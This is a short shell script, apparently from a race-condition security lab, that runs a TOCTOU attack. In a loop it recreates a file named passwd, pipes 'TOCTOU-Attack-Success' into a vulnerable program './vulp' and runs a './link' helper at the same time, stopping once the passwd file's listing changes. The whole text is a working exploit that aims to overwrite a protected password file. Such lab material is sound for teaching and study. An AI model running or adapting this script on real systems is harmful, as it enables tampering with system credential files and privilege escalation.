#!/bin/sh
# exploit.sh

old=`ls -l passwd`
new=`ls -l passwd`

echo $old
echo $new

while [ "$old" = "$new" ]
do
	rm -f passwd;
	echo "This is a file that the user can overwrite" > passwd
	echo "TOCTOU-Attack-Success" | ./vulp passwd &
	./link passwd &
	new=`ls -l passwd`
done

echo "STOP... The passwd file has been changed"
